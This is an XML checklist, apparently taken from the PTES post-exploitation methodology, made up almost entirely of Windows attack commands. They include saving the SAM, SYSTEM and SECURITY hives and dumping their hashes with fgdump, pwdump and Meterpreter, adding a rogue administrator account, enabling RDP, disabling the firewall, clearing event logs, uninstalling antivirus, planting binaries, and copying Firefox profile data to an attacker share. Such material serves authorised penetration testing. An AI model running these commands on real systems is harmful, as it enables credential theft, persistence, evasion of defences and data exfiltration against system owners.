<?xml version="1.0"?>
<methodology>
	<name>PTES Post Exploitation</name>
	<sections>
		<section>
			<name>Windows Post Exploitation</name>
			<tasks>
				<task>Blind Files: Pull when all you can do is to blindly read. LFI/Directory traversal(s). Files that will have the same name across networks / Windows domains / systems. Files: %SYSTEMDRIVE%\boot.ini, %WINDIR%\win.ini, %SYSTEMROOT%\repair\SAM, %SYSTEMROOT%\System32\config\RegBack\SAM, %SYSTEMROOT%\repair\system, %SYSTEMROOT%\System32\config\RegBack\system</task>
				<task>Non Interactive Command Execution</task>
				<task>System Commands. Commands: whoami /all ,  set ,  fsutil fsinfo drives ,  reg query HKLM /s /d /f "C:\* *.exe" | find /I "C:\" | find /V """"</task>
				<task>Networking Commands - ipconfig. Commands: ipconfig /all ,  ipconfig /displaydns</task>
				<task>Networking Commands - netstat. Commands: netstat -nabo ,  netstat -s -p [tcp|udp|icpm|ip] ,  netstat -r ,  netstat -na | findstr :445 ,  netstat -nao | findstr LISTENING ,  netstat -nao | findstr LISTENING ,  netstat -na | findstr LISTENING ,  </task>
				<task>Networking Commands - net. Commands: netsh diag show all ,  net view ,  net view /domain ,  net view /domain:otherdomain ,  net user %USERNAME% /domain ,  net user /domain ,  net accounts ,  net accounts /domain ,  net localgroup administrators ,  net localgroup administrators /domain ,  	net group “Domain Admins” /domain ,  net group “Enterprise Admins” /domain ,  net group “Domain Controllers” /domain ,  nbtstat -a [ip here] ,  net share ,  find / "\\" ,  arp -a ,  route print ,  browstat</task>
				<task>Configs Commands: gpresult /z ,  sc qc ,  sc query ,  sc queryex ,  type %WINDIR%\System32\drivers\etc\hosts ,  dir %PROGRAMFILES% ,  echo %COMSPEC%</task>
				<task>Finding Important Files Commands: tree C:\ /f /a > C:\output_of_tree.txt ,  dir /a ,  dir /b /s [Directory or Filename] ,  dir \ /s /b | find /I "searchstring" ,  command | find /c /v ""</task>
				<task>Files To Pull (if possible): %SYSTEMDRIVE%\pagefile.sys.</task>
				<task>Files To Pull (if possible): %WINDIR%\debug\NetSetup.lo</task>
				<task>Files To Pull (if possible): %WINDIR%\repair\sam, %WINDIR%\repair\system, %WINDIR%\repair\software, %WINDIR%\repair\security</task>
				<task>Files To Pull (if possible): %WINDIR%\system32\config\AppEvent.Evt, %WINDIR%\system32\config\SecEvent.Evt, %WINDIR%\system32\config\default.sav, %WINDIR%\system32\config\security.sav, %WINDIR%\system32\config\software.sav, %WINDIR%\system32\config\system.sav</task>
				<task>Files To Pull (if possible): %WINDIR%\iis6.log. Description: iis5.log, ii6.log or iis7.log	</task>
				<task>Files To Pull (if possible): %WINDIR%\system32\logfiles\httperr\httperr1.log Description: IIS 6 error log</task>
				<task>Files To Pull (if possible): %SystemDrive%\inetpub\logs\LogFiles Description: IIS 7’s logs location</task>
				<task>Files To Pull (if possible): %WINDIR%\system32\logfiles\w3svc1\exYYMMDD.log, %WINDIR%\system32\CCM\logs\*.log</task>
				<task>Files To Pull (if possible): %USERPROFILE%\ntuser.dat, %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat</task>
				<task>Files To Pull (if possible): %WINDIR%\System32\drivers\etc\hosts</task>
				<task>Remove System Access. Commands: net share \\computername ,  tasklist /V /S computername ,  qwinsta /SERVER:computername ,  qprocess /SERVER:computername * ,  net use \\computername ,  net use \\computername /user:DOMAIN\username password ,  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f ,  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f ,  net time \\computername ,  dir \\computername\share_or_admin_share\	,  tasklist /V /S computername</task>
				<task>Auto-Start Directories. Command: ver .  Description: Returns kernel version - like uname on *nix</task>
				<task>Binary Planting. Location: msiexec.exe .  Description: Idea taken from here: http://goo.gl/E3LTa - put evil binary named msiexec.exe in Downloads directory and when a installer calles msiexec without specifying path, you get code execution.</task>
				<task>Binary Planting. Location: %SystemRoot%\System32\wbem\mof\ .  Description: Taken from stuxnet: http://blogs.iss.net/archive/papers/ibm-xforce-an-inside-look-at-stuxnet.pdf Look for Print spooler vuln</task>
				<task>WMI: wmic bios ,  wmic ,  wmic qfe get hotfixid (gets patches IDs) ,  wmic startup ,  wmic service ,  wmic process (get caption,executablepath,commandline) ,  wmic process call create “process_name” (executes a program) ,  wmic process where name=”process_name” call terminate (terminates program) ,  wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (Hard drive information) ,  wmic useraccount (Usernames, sid, and various security related goodies) ,  wmic useraccount get /ALL ,  wmic share get /ALL (You can use ? for gets help) ,  wmic startup list full (This can be a huge list!!!) ,  wmic /node:"hostname" bios get serialnumber (This can be great for finding warranty info about target)</task>
				<task>Reg Command exit: reg save HKLM\Security security.hive (Save security hive to a file) ,  reg save HKLM\System system.hive (Save system hive to a file) ,  reg save HKLM\SAM sam.hive (Save sam to a file) ,  reg add [\\TargetIPaddr\] [RegDomain][ \Key ] ,  reg export [RegDomain]\[Key] [FileName] ,  reg import [FileName ] ,  reg query [\\TargetIPaddr\] [RegDomain]\[ Key ] /v [Valuename!] (you can to add /s for recurse all values)</task>
				<task>Deleting Logs: wevtutil el (list logs) ,  wevtutil cl [LogName] (Clear specific lowbadming) ,  del %WINDIR%\*.log /a /s /q /f</task>
				<task>Uninstalling Software “AntiVirus” (Non interactive): wmic product get name /value (this gets software names) ,  wmic product where name="XXX" call uninstall /nointeractive (this uninstalls software)</task>
				<task>Other: pkgmgr usefull /iu :”Package” ,  pkgmgr usefull /iu :”TelnetServer” (Install Telnet Service ...) ,  pkgmgr /iu:”TelnetClient” (Client ) ,  rundll32.exe user32.dll, LockWorkStation (locks the screen -invasive-) ,  wscript.exe <script js/vbs> ,  cscript.exe <script js/vbs/c#> ,  xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\*.sqlite \\your_box\firefox_funstuff</task>
				<task>Operating Specific - Win2k3: winpop stat domainname</task>
				<task>Operating Specific - Vista/7: winstat features ,  wbadmin get status ,  wbadmin get items ,  gpresult /H gpols.htm ,  <code>bcdedit /export <filename></task>
				<task>Operating Specific - Vista SP1/7/2008/2008R2 (x86, x64): Enable/Disable Windows features with Deployment Image Servicing and Management (DISM). Works well after bypassuac + getsystem. For Dism.exe to work on x64 systems, the long commands are necessary. To list features which can be enabled/disabled: %windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /get-features .  To enable a feature (TFTP client for example): %windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /enable-feature /featurename:TFTP .  To disable a feature (again TFTP client): %windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /disable-feature /featurename:TFTP</task>
				<task>Invasive or Altering Commands: These commands change things on the target and can lead to getting detected. Commands: net user hacker hacker /add	,  net localgroup administrators /add hacker ,  net localgroup administrators hacker /add ,  net share nothing$=C:\ /grant:hacker,FULL /unlimited ,  net user username /active:yes /domain ,  netsh firewall set opmode disable ,  netsh firewall set opmode enable</task>
				<task>Support Tools Binaries / Links / Usage: REMEMBER: DO NOT RUN BINARIES YOU HAVEN’T VETTED. Examples: carrot.exe /im /ie /ff /gc /wlan /vnc /ps /np /mp /dialup /pwdump	(Source: http://h.ackack.net/carrot-exe.html) ,  PwDump7.exe > ntlm.txt (Source: http://www.tarasco.org/security/pwdump_7/) ,  Nircommands	(Source: http://www.nirsoft.net/utils/nircmd.html) ,  wce.exe (Source: http://www.ampliasecurity.com/research/wce_v1_2.tgz) ,  adfind.exe -b ou=ActiveDirectory,dc=example,dc=com -f "objectClass=user" sn givenName samaccountname -nodn -adcsv > exported_users.csv (Source: http://www.joeware.net/freetools/</task>
				<task>Various tools: (e.g. \\hackarmoury.com\tools\all_binaries\fgdump.exe) Some examples of protocols in use: http://hackarmoury.com/tools, \\hackarmoury.com\tools, ftp://hackarmoury.com, svn://hackarmoury.com</task>
			</tasks>
		</section>
		<section>
			<name>Obtaining Password Hashes in Windows</name>
			<tasks>
				<task>LSASS Injection - Pwdump6 and Fgdump: Fgdump implements a number of features that Pwdump6 does not and is the preferred tool to use. Also, the user account must be an administrator on the target machine. To dump passwords on the local host with the credential of the current user use: fgdump .  To dump passwords on the local host with other credentials use: fgdump -h 127.0.0.1 -u adminuser .  To dump passwords on a remote host with specified credentials use: fgdump -h 192.168.0.1 -u adminuser -p password</task>
				<task>LSASS Injection - Hashdump in Meterpreter: From the meterpreter prompt run hashdump.</task>
				<task>Extracting Passwords from Registry: You will need to copy the SAM, system, and security files from the target machine to your machine. The files are located in C:\WINDOWS\system32\config and are typically inaccessible while the machine is running. Fortunately, you can get a copy of the files from the registry in HKEY_LOCAL_MACHINE and some times you can find them in c:\WINDOWS\repair.</task>
				<task>Copy from the Registry: reg save HKLM\SAM c:\sam.reg ,  reg save HKLM\SYSTEM c:\system.reg ,  reg save HKLM\SECURITY c:\security.reg .  If you get an "Access Denied" error message when trying to save the SECURITY hive then try: at 12:00 reg save HKLM\SECURITY c:\security.reg .  You are using the at command to schedule the reg command so set the time appropriately.</task>
				<task>Extracting the Hashes: Creddump includes three python scripts designed to extract the local password hashes (pwdump.py), the cached credentials (cachedump.py), and the LSA secrets (lsadump.py). To get the local password hashes use: pwdump.py system.reg sam.reg. To get the cached credentials use: cachedump.py system.reg security.reg.</task>
				<task>Extracting Passwords from Registry using Meterpreter: In Meterpreter use the command run post/windows/gather/hashdump to get the local hashes from the SAM database. To get the cached hashes you will need to download the cachedump.rb module from http://lab.mediaservice.net/code/cachedump.rb and put it into <msf3>/modules/post/windows/gather. Then you can run the command run post/windows/gather/cachedump.</task>
			</tasks>
		</section>
	</sections>
</methodology>